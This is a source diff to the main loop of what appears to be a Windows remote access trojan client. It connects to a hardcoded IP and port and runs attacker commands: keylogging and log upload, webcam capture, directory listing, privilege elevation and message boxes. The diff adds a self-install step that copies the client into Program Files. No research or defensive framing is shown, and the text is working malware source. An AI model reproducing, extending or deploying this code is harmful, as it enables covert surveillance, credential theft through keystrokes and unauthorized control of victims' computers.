@@ -19,6 +19,7 @@
 #include "screen/ScreenStreamer.h"
 #include "state/SystemState.h"
 
+
 #define IP "192.168.1.133"
 
 #define PORT 3055
@@ -32,12 +33,29 @@
 #define WEBCAM
 
 #ifdef WEBCAM
+
 #include "webcam/WebcamManager.h"
+
 #endif
 
-int main() {
+#define INSTALL "C:\\Program Files (x86)\\Client\\client.exe"
+
+#ifdef INSTALL
+
+#include "install/Install.h"
+
+#endif
+
+
+
+int main(int argc,char*argv[]) {
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
+
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
+
+#ifdef INSTALL
+Install::installClient(INSTALL,argv[0]);
+#endif
         bool connectionState = true;
         while (connectionState) {
             std::cout << "trying to connect " << std::endl;
@@ -59,13 +77,13 @@ int main() {
                 while (streamListening) {
                     int action = stream.readSize();
                     switch (action) {
-                        case -2:{
-                            connectionState=false;
-                            streamListening=false;
+                        case -2: {
+                            connectionState = false;
+                            streamListening = false;
                             break;
                         }
-                        case -1:{
-                            streamListening=false;
+                        case -1: {
+                            streamListening = false;
                             break;
                         }
                         case 0: {
@@ -102,7 +120,8 @@ int main() {
                         case 4: {
                             std::cout << "READING ONLY DIRECTORIES" << std::endl;
                             std::string path = stream.readString();
-                            std::string vectorOfFiles = FileManager::readDirectory(std::filesystem::u8path(path), true,false);
+                            std::string vectorOfFiles = FileManager::readDirectory(std::filesystem::u8path(path), true,
+                                                                                   false);
                             stream.sendString(vectorOfFiles.c_str());
                             break;
                         }
@@ -161,7 +180,8 @@ int main() {
                             std::cout << "START KEYLOGGER" << std::endl;
                             keyLogger.tryStart();
                             break;
-                        } case 13:{
+                        }
+                        case 13: {
                             std::cout << "STOP KEYLOGGER" << std::endl;
                             if (keyLogger.isRecordingKeys()) keyLogger.setRecordingKeys(false);
                             break;
@@ -177,18 +197,18 @@ int main() {
                             keyLogger.sendAllKeyLoggerLogs();
                             break;
                         }
-                        case 1403:{
+                        case 1403: {
                             std::cout << "CHECK LAST " << std::endl;
                             stream.sendSize(keyLogger.lastLogExists());
                             break;
                         }
-                        case 1404:{
+                        case 1404: {
                             std::cout << "CHECK ALL " << std::endl;
                             std::cout << keyLogger.logsExists();
                             stream.sendSize(keyLogger.logsExists());
                             break;
                         }
-                        case 15:{
+                        case 15: {
                             std::cout << "GET INFORMATION " << std::endl;
                             stream.sendSize(keyLogger.isRecordingKeys());
                             break;
@@ -209,7 +229,10 @@ int main() {
                         }
 
                         case 17: {
-                        #ifdef WEBCAM
+#ifdef WEBCAM
+
+
+
                             std::cout << "START WEBCAM" << std::endl;
                             std::string webcamName = stream.readString();
                             bool fragmented = stream.readSize();
@@ -226,7 +249,7 @@ int main() {
                                     webcam.startWebcam();
                                 }
                             }
-                            #endif
+#endif
                             break;
 
                         }
@@ -248,14 +271,14 @@ int main() {
                             std::cout << "elevate permission" << std::endl;
                             BOOL result;
                             result = Permission::elevatePermissions();
-                            if (result==1) {
+                            if (result == 1) {
                                 stream.sendSize(1);
                                 return 0;
                             }
                             stream.sendSize(result);
                             break;
                         }
-                        case 21:{
+                        case 21: {
                             std::cout << "SHOW MESSAGE BOX " << std::endl;
                             std::string boxInformation = stream.readString();
                             MessageBoxGUI messageBox(boxInformation);
